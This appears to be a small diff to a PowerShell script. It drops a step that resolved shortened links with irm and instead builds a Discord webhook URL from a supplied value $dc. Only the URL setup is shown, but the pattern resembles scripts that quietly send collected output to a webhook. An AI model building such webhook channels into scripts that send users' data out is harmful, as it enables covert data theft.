@@ -1,6 +1,7 @@
 $whuri = "$dc"
-# shortened URL Detection
-if ($whuri.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $whuri = (irm $whuri).url}
+if ($whuri.Length -lt 120){
+	$whuri = ("https://discord.com/api/webhooks/" + "$dc")
+}
 
 $outfile=""
 $a=0
